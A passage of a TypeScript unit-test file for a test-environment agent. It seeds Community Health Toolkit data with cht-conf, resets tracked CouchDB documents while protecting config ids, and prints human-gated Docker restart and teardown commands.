      let removeOwnedStub: sinon.SinonStub;
      let recordOwnedStub: sinon.SinonStub;
      // cht-conf output per verb; a seed makes up to three separate calls.
      let runs: Record<string, ChtConfExecResult>;
      const verbsRun = (): string[] => runChtConfStub.getCalls().map((call) => call.args[0].verbs[0]);

      beforeEach(() => {
        realAgent = new TestEnvironmentAgent({ useMockDocker: false });
        runs = {
          'csv-to-docs': okRun(ansiInfo('Processing 5 rows')),
          'upload-docs': okRun(ansiInfo('Summary: 5 of 5 docs uploaded OK.')),
          'create-users': okRun(ansiInfo('Creating user alice')),
        };
        runChtConfStub = sinon.stub(chtConfRunner, 'runChtConf').callsFake(async (opts) => runs[opts.verbs[0]]);
        readSeededDocsStub = sinon.stub(testData, 'readSeededDocs').returns(seededDocs);
        hasUsersCsvStub = sinon.stub(testData, 'hasUsersCsv').returns(true);
        hasCsvInputStub = sinon.stub(testData, 'hasCsvInput').returns(true);
        findForeignStub = sinon.stub(testData, 'findForeignDocFiles').returns([]);
        removeOwnedStub = sinon.stub(testData, 'removeOwnedDocFiles').returns(0);
        recordOwnedStub = sinon.stub(testData, 'recordOwnedDocFiles');
      });

      afterEach(() => {
        sinon.restore();
      });

      it('should require a dataPath', async () => {
        try {
          await realAgent.prepareTestData(dockerHandle, sampleConfig, {});
          expect.fail('expected prepareTestData to reject');
        } catch (error) {
          expect((error as Error).message).to.include('dataPath');
        }
      });

      it('should run csv-to-docs, upload-docs and create-users as separate cht-conf calls', async () => {
        await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(verbsRun()).to.deep.equal(['csv-to-docs', 'upload-docs', 'create-users']);
        const uploadCall = runChtConfStub.secondCall.args[0];
        expect(uploadCall.instanceUrl).to.equal('https://medic:password@nginx/');
        expect(uploadCall.configPath).to.equal(dataPath);
        expect(uploadCall.cwd).to.equal(dataPath);
      });

      it('should pass an absolute path to cht-conf when given a relative dataPath', async () => {
        await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath: 'relative/data' });

        const call = runChtConfStub.firstCall.args[0];
        expect(call.configPath).to.equal(resolve('relative/data'));
        expect(call.cwd).to.equal(resolve('relative/data'));
      });

      it('should clear the files a previous run generated before converting', async () => {
        removeOwnedStub.returns(3);

        await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(removeOwnedStub.calledOnceWith(dataPath)).to.equal(true);
        expect(removeOwnedStub.calledBefore(runChtConfStub)).to.equal(true);
      });

      it('should refuse json_docs files it did not generate, naming them, before touching anything', async () => {
        // json_docs is also cht-conf's hand-authored upload-docs input directory.
        findForeignStub.returns(['hand-authored.doc.json']);

        try {
          await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });
          expect.fail('expected prepareTestData to reject');
        } catch (error) {
          expect((error as Error).message).to.include('did not generate');
          expect((error as Error).message).to.include('hand-authored.doc.json');
        }
        expect(removeOwnedStub.called).to.equal(false);
        expect(runChtConfStub.called).to.equal(false);
      });

      it('should upload a hand-authored json_docs untouched when there is no csv input', async () => {
        hasCsvInputStub.returns(false);

        await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(findForeignStub.called).to.equal(false);
        expect(removeOwnedStub.called).to.equal(false);
        expect(recordOwnedStub.called).to.equal(false);
        expect(verbsRun()).to.deep.equal(['upload-docs', 'create-users']);
      });

      it('should record what csv-to-docs generated as this layer\'s own', async () => {
        await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(recordOwnedStub.calledOnceWith(dataPath)).to.equal(true);
        expect(recordOwnedStub.firstCall.calledAfter(runChtConfStub.firstCall)).to.equal(true);
      });

      it('should record partial csv-to-docs output too, and not upload, when conversion fails', async () => {
        runs['csv-to-docs'] = { exitCode: 1, output: '\x1b[31mERROR bad row 3 \x1b[0m', timedOut: false };

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(recordOwnedStub.calledOnce).to.equal(true);
        expect(verbsRun()).to.not.include('upload-docs');
        expect(result.succeeded).to.equal(false);
        expect(result.warnings.join(' ')).to.include('ERROR bad row 3');
      });

      it('should refuse protected config ids BEFORE upload-docs can write them', async () => {
        readSeededDocsStub.returns([{ id: 'place-1', type: 'clinic' }, { id: 'settings', type: 'clinic' }]);

        try {
          await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });
          expect.fail('expected prepareTestData to reject');
        } catch (error) {
          expect((error as Error).message).to.include('contains protected config doc(s) settings');
        }
        expect(verbsRun()).to.deep.equal(['csv-to-docs']);
      });

      it('should classify the seeded docs against the discovered config', async () => {
        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(readSeededDocsStub.calledOnceWith(dataPath)).to.equal(true);
        expect(result.placesCreated).to.equal(2);
        expect(result.peopleCreated).to.equal(1);
        expect(result.reportsCreated).to.equal(1);
        expect(result.seededDocIds).to.deep.equal(['place-1', 'place-2', 'person-1', 'report-1', 'user-doc-1']);
        expect(result.succeeded).to.equal(true);
        expect(result.warnings).to.deep.equal([]);
      });

      it('should count created users from the create-users output', async () => {
        runs['create-users'] = okRun([ansiInfo('Creating user alice'), ansiInfo('Creating user bob')].join('\n'));

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(result.usersCreated).to.equal(2);
      });

      it('should skip create-users when the data project has no users.csv', async () => {
        hasUsersCsvStub.returns(false);

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(verbsRun()).to.deep.equal(['csv-to-docs', 'upload-docs']);
        expect(result.usersCreated).to.equal(0);
        expect(result.succeeded).to.equal(true);
      });

      it('should report succeeded:false on a partial upload, and say why', async () => {
        // upload-docs exits 0 even when it rejects docs; re-seeding a static dataset conflicts.
        runs['upload-docs'] = okRun(ansiInfo('Summary: 3 of 5 docs uploaded OK.'));

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(result.succeeded).to.equal(false);
        expect(result.warnings.join(' ')).to.include('only 3 of 5 docs uploaded');
      });

      it('should warn when json_docs ends up empty (no csv inputs)', async () => {
        runs['csv-to-docs'] = okRun(ansiInfo('No csv directory found at /mnt/test-data/csv.'));
        runs['upload-docs'] = okRun('');
        readSeededDocsStub.returns([]);
        hasUsersCsvStub.returns(false);

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(result.seededDocIds).to.deep.equal([]);
        expect(result.warnings.join(' ')).to.include('no docs in /mnt/test-data/json_docs');
      });

      it('should report succeeded:false when upload-docs fails, with cht-conf\'s reason', async () => {
        runs['upload-docs'] = { exitCode: 1, output: '\x1b[31mERROR boom \x1b[0m', timedOut: false };

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(result.succeeded).to.equal(false);
        expect(result.warnings.join(' ')).to.include('exited with code 1');
        expect(result.warnings.join(' ')).to.include('ERROR boom');
        expect(result.seededDocIds).to.have.lengthOf(5);
      });

      it('should not count the create-users attempt that failed', async () => {
        runs['create-users'] = {
          exitCode: 1,
          output: [ansiInfo('Creating user alice'), ansiInfo('Creating user bob'), 'ERROR 400'].join('\n'),
          timedOut: false,
        };

        const result = await realAgent.prepareTestData(dockerHandle, sampleConfig, { dataPath });

        expect(result.usersCreated).to.equal(1);
        expect(result.succeeded).to.equal(false);
        expect(result.warnings.join(' ')).to.include('create-users');
      });
    });
  });

  describe('reset', () => {
    const tiers: ResetTier[] = ['couchdb', 'restart', 'full'];

    tiers.forEach(tier => {
      it(`should report a no-op reset result in mock mode for the "${tier}" tier`, async () => {
        const handle = await provisionMock();

        const result = await agent.reset(handle, tier);

        expect(result.tier).to.equal(tier);
        expect(result.wiped).to.equal(0);
        expect(result.reseeded).to.equal(0);
        expect(result.protectedSkipped).to.deep.equal([]);
      });
    });

    describe('real mode (useMockDocker: false)', () => {
      let realAgent: TestEnvironmentAgent;
      const dockerHandle: EnvironmentHandle = {
        url: 'https://nginx',
        auth: { user: 'medic', password: 'password' },
        network: 'cht-agent-net',
        chtCorePath: '/workspace/cht-core',
        source: 'docker',
      };

      beforeEach(() => {
        realAgent = new TestEnvironmentAgent({ useMockDocker: false });
      });

      afterEach(() => {
        sinon.restore();
      });

      it('should print a runnable restart gate quoting the cht-core path (human-gated, agent runs no Docker)', async () => {
        const logSpy = sinon.spy(console, 'log');

        const result = await realAgent.reset(dockerHandle, 'restart');

        expect(result.performedBy).to.equal('human-gate');
        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
        expect(lines.some((line) => line.includes("scripts/test-env-restart.sh '/workspace/cht-core'"))).to.equal(
          true
        );
      });

      it('should print the full-tier gate naming both scripts with the quoted path', async () => {
        const logSpy = sinon.spy(console, 'log');

        await realAgent.reset(dockerHandle, 'full');

        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
        // A full reset is a fresh stack, so the gate rebuilds (Model A tests the code as it is now).
        const expected =
          "scripts/test-env-down.sh '/workspace/cht-core' && CHT_CORE_REBUILD=1 scripts/test-env-up.sh '/workspace/cht-core'";
        expect(lines.some((line) => line.includes(expected))).to.equal(true);
      });

      describe('couchdb tier (the agent-owned reset)', () => {
        const dataPath = '/mnt/test-data';
        const ansiInfo = (message: string): string => `\x1b[32mINFO ${message} \x1b[0m`;
        const okRun = (output: string): ChtConfExecResult => ({ exitCode: 0, output, timedOut: false });
        const seedConfig: DiscoveredConfig = {
          contactTypes: [{ id: 'clinic' }, { id: 'person', person: true }],
          roles: {},
          permissions: {},
          transitions: {},
          forms: [],
        };

        let agentUnderTest: TestEnvironmentAgent;
        let runChtConfStub: sinon.SinonStub;
        let readSeededDocsStub: sinon.SinonStub;
        let fetchDocRevsStub: sinon.SinonStub;
        let bulkDocsStub: sinon.SinonStub;

        beforeEach(() => {
          agentUnderTest = new TestEnvironmentAgent({ useMockDocker: false });
          runChtConfStub = sinon.stub(chtConfRunner, 'runChtConf');
          readSeededDocsStub = sinon.stub(testData, 'readSeededDocs').returns([
            { id: 'place-1', type: 'clinic' },
            { id: 'person-1', type: 'person' },
          ]);
          sinon.stub(testData, 'hasUsersCsv').returns(false);
          // Stubbed explicitly: the real existsSync would silently decide which path runs.
          sinon.stub(testData, 'hasCsvInput').returns(false);
          fetchDocRevsStub = sinon.stub(chtApi, 'fetchDocRevs').resolves([
            { id: 'place-1', rev: '7-live' },
            { id: 'person-1', rev: '2-live' },
          ]);
          bulkDocsStub = sinon.stub(chtApi, 'bulkDocs').resolves([
            { id: 'place-1', ok: true },
            { id: 'person-1', ok: true },
          ]);
        });

        afterEach(() => {
          sinon.restore();
        });

        // Seed the agent's per-env tracking the way real use would.
        const seedTracking = async (): Promise<void> => {
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
          await agentUnderTest.prepareTestData(dockerHandle, seedConfig, { dataPath });
          runChtConfStub.resetHistory();
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
        };

        it('should be a no-op when nothing was seeded for this environment', async () => {
          const result = await agentUnderTest.reset(dockerHandle, 'couchdb');

          expect(result.wiped).to.equal(0);
          expect(result.reseeded).to.equal(0);
          expect(fetchDocRevsStub.called).to.equal(false);
          expect(bulkDocsStub.called).to.equal(false);
          expect(runChtConfStub.called).to.equal(false);
        });

        it('should wipe the tracked docs at their CURRENT revs and reseed from the tracked project', async () => {
          await seedTracking();

          await agentUnderTest.reset(dockerHandle, 'couchdb');

          // Read live revs before the wipe, then again to confirm the reseed restored them.
          expect(fetchDocRevsStub.callCount).to.equal(2);
          expect(fetchDocRevsStub.firstCall.args).to.deep.equal(['https://nginx', dockerHandle.auth, ['place-1', 'person-1']]);
          expect(bulkDocsStub.firstCall.args[2]).to.deep.equal([
            { _id: 'place-1', _rev: '7-live', _deleted: true },
            { _id: 'person-1', _rev: '2-live', _deleted: true },
          ]);
          const reseedCall = runChtConfStub.firstCall.args[0];
          expect(reseedCall.verbs).to.deep.equal(['upload-docs']);
          expect(reseedCall.configPath).to.equal(dataPath);
          expect(reseedCall.cwd).to.equal(dataPath);
        });

        it('should skip tombstoned and never-existed docs in the wipe', async () => {
          await seedTracking();
          fetchDocRevsStub.onFirstCall().resolves([
            { id: 'place-1', rev: '7-live' },
            { id: 'person-1', rev: '2-tomb', deleted: true },
          ]);
          bulkDocsStub.resolves([{ id: 'place-1', ok: true }]);

          const result = await agentUnderTest.reset(dockerHandle, 'couchdb');

          expect(bulkDocsStub.firstCall.args[2]).to.deep.equal([
            { _id: 'place-1', _rev: '7-live', _deleted: true },
          ]);
          // The doc a test deleted is recreated by the reseed and counted as restored.
          expect(result.wiped).to.equal(1);
          expect(result.reseeded).to.equal(2);
        });

        it('should throw when a deletion is rejected (half-reset must not pass as clean)', async () => {
          await seedTracking();
          bulkDocsStub.resolves([
            { id: 'place-1', ok: true },
            { id: 'person-1', error: 'conflict', reason: 'Document update conflict.' },
          ]);

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('failed to delete 1 doc(s): person-1');
          }
        });

        it('should throw when the reseed upload fails', async () => {
          await seedTracking();
          runChtConfStub.resolves({ exitCode: 1, output: 'ERROR boom', timedOut: false });

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('reseed failed');
          }
        });

        it('should throw when CouchDB shows a wiped doc did not come back', async () => {
          await seedTracking();
          fetchDocRevsStub.onSecondCall().resolves([
            { id: 'place-1', rev: '8-new' },
            { id: 'person-1', rev: '3-tomb', deleted: true },
          ]);

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('1 doc(s) are missing after the reseed: person-1');
          }
        });

        it('should fail closed BEFORE the wipe when the reseed source is gone', async () => {
          await seedTracking();
          readSeededDocsStub.returns([]); // json_docs vanished since seeding

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('cannot restore 2 of the 2');
          }
          expect(fetchDocRevsStub.called).to.equal(false);
          expect(bulkDocsStub.called).to.equal(false);
        });

        it('should throw when the reseed restored nothing, whatever upload-docs printed', async () => {
          await seedTracking();
          runChtConfStub.resolves(okRun(ansiInfo('No docs directory found at /mnt/test-data/json_docs.')));
          fetchDocRevsStub.onSecondCall().resolves([
            { id: 'place-1', rev: '8-tomb', deleted: true },
            { id: 'person-1', rev: '3-tomb', deleted: true },
          ]);

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('2 doc(s) are missing after the reseed');
          }
        });

        it('should refuse to wipe tracked docs the data project can no longer restore', async () => {
          await seedTracking();
          readSeededDocsStub.returns([{ id: 'place-1', type: 'clinic' }]); // the dataset shrank

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('cannot restore 1 of the 2 doc(s) it would wipe (person-1)');
          }
          expect(bulkDocsStub.called).to.equal(false);
        });

        it('should not let a failed re-seed clobber the wipe worklist', async () => {
          await seedTracking();
          // A later seeding attempt fails after its json_docs were cleaned.
          readSeededDocsStub.returns([]);
          runChtConfStub.resolves({ exitCode: 1, output: 'ERROR boom', timedOut: false });
          await agentUnderTest.prepareTestData(dockerHandle, seedConfig, { dataPath: '/mnt/other-data' });

          // The original worklist must still drive the wipe.
          readSeededDocsStub.returns([
            { id: 'place-1', type: 'clinic' },
            { id: 'person-1', type: 'person' },
          ]);
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
          await agentUnderTest.reset(dockerHandle, 'couchdb');

          expect(fetchDocRevsStub.firstCall.args[2]).to.deep.equal(['place-1', 'person-1']);
        });

        it('should reseed with the same bin/timeoutMs the seed ran with (no version or timeout skew)', async () => {
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
          await agentUnderTest.prepareTestData(dockerHandle, seedConfig, {
            dataPath,
            bin: '/mnt/test-data/node_modules/.bin/cht',
            timeoutMs: 240_000,
          });
          runChtConfStub.resetHistory();
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));

          await agentUnderTest.reset(dockerHandle, 'couchdb');

          const reseedCall = runChtConfStub.lastCall.args[0];
          expect(reseedCall.bin).to.equal('/mnt/test-data/node_modules/.bin/cht');
          expect(reseedCall.timeoutMs).to.equal(240_000);
        });

        it('should report what the reset actually did', async () => {
          await seedTracking();

          const result = await agentUnderTest.reset(dockerHandle, 'couchdb');

          expect(result).to.deep.equal({
            tier: 'couchdb',
            wiped: 2,
            reseeded: 2,
            performedBy: 'agent',
            protectedSkipped: [],
          });
        });

        it('should accept an explicit worklist so a handle reloaded elsewhere can drive the reset', async () => {
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));

          const result = await agentUnderTest.reset(dockerHandle, 'couchdb', {
            dataPath,
            docIds: ['place-1', 'person-1'],
          });

          expect(fetchDocRevsStub.firstCall.args).to.deep.equal(['https://nginx', dockerHandle.auth, ['place-1', 'person-1']]);
          expect(result.wiped).to.equal(2);
        });

        it('should reseed a SUBSET worklist against a real upload-docs summary', async () => {
          // upload-docs re-uploads every json_docs file with no _rev: the wiped doc is
          // recreated OK, the un-wiped one conflicts, so cht-conf reports "1 of 2".
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 1 of 2 docs uploaded OK.')));
          fetchDocRevsStub.resolves([{ id: 'place-1', rev: '7-live' }]);
          bulkDocsStub.resolves([{ id: 'place-1', ok: true }]);

          const result = await agentUnderTest.reset(dockerHandle, 'couchdb', {
            dataPath,
            docIds: ['place-1'],
          });

          expect(bulkDocsStub.firstCall.args[2]).to.deep.equal([
            { _id: 'place-1', _rev: '7-live', _deleted: true },
          ]);
          expect(result.wiped).to.equal(1);
          expect(result.reseeded).to.equal(1);
        });

        it('should refuse to wipe protected config ids supplied in the worklist', async () => {
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
          fetchDocRevsStub.resolves([{ id: 'place-1', rev: '7-live' }]);
          bulkDocsStub.resolves([{ id: 'place-1', ok: true }]);

          const result = await agentUnderTest.reset(dockerHandle, 'couchdb', {
            dataPath,
            docIds: ['place-1', 'settings', 'form:pregnancy', 'org.couchdb.user:chw'],
          });

          expect(fetchDocRevsStub.firstCall.args[2]).to.deep.equal(['place-1']);
          expect(result.protectedSkipped).to.deep.equal([
            'settings',
            'form:pregnancy',
            'org.couchdb.user:chw',
          ]);
        });

        it('should reject an explicit docIds worklist with no dataPath to reseed from', async () => {
          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb', { docIds: ['place-1'] });
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('also needs options.dataPath');
          }
        });

        it('should refuse to reseed when a protected config doc was planted in json_docs after the seed', async () => {
          // upload-docs --force filters nothing, so a planted protected id would be
          // CREATED on the instance. Refuse before wiping anything.
          await seedTracking();
          fetchDocRevsStub.resetHistory();
          readSeededDocsStub.returns([
            { id: 'place-1', type: 'clinic' },
            { id: 'person-1', type: 'person' },
            { id: 'settings', type: 'clinic' },
          ]);

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('contains protected config doc(s) settings');
          }
          expect(fetchDocRevsStub.called).to.equal(false);
          expect(bulkDocsStub.called).to.equal(false);
        });

        it('should throw when _bulk_docs acknowledges fewer deletions than were submitted', async () => {
          await seedTracking();
          bulkDocsStub.resolves([{ id: 'place-1', ok: true }]);

          try {
            await agentUnderTest.reset(dockerHandle, 'couchdb');
            expect.fail('expected reset to reject');
          } catch (error) {
            expect((error as Error).message).to.include('acknowledged 1 of 2');
          }
        });

        it('should track environments separately when parallel networks share the service hostname', async () => {
          await seedTracking();
          const otherEnv: EnvironmentHandle = { ...dockerHandle, network: 'cht-agent-net-2' };

          const result = await agentUnderTest.reset(otherEnv, 'couchdb');

          expect(result.wiped).to.equal(0);
          expect(fetchDocRevsStub.called).to.equal(false);
        });

        it('should keep tracking across teardown: CouchDB data is a bind mount that survives down -v', async () => {
          await seedTracking();

          await agentUnderTest.teardown(dockerHandle);
          const result = await agentUnderTest.reset(dockerHandle, 'couchdb');

          expect(result.wiped).to.equal(2);
        });

        it('should reset against an absolute dataPath even if the process cwd changes after seeding', async () => {
          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
          await agentUnderTest.prepareTestData(dockerHandle, seedConfig, { dataPath: 'relative/data' });
          runChtConfStub.resetHistory();

          await agentUnderTest.reset(dockerHandle, 'couchdb');

          expect(readSeededDocsStub.lastCall.args[0]).to.equal(resolve('relative/data'));
          expect(runChtConfStub.lastCall.args[0].configPath).to.equal(resolve('relative/data'));
        });
      });
    });
  });

  describe('teardown', () => {
    it('should resolve in mock mode', async () => {
      const handle = await provisionMock();

      expect(await agent.teardown(handle)).to.be.undefined;
    });

    it('should print the human teardown gate with the cht-core path shell-quoted (real mode)', async () => {
      const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
      const handle: EnvironmentHandle = {
        url: 'https://nginx',
        auth: { user: 'medic', password: 'password' },
        network: 'cht-agent-net',
        chtCorePath: '/workspace/cht-core',
        source: 'docker',
      };
      const logSpy = sinon.spy(console, 'log');

      await realAgent.teardown(handle);

      logSpy.restore();
      const lines = logSpy.getCalls().map((call) => String(call.args[0]));
      expect(lines.some((line) => line.includes("scripts/test-env-down.sh '/workspace/cht-core'"))).to.equal(true);
    });
  });
});
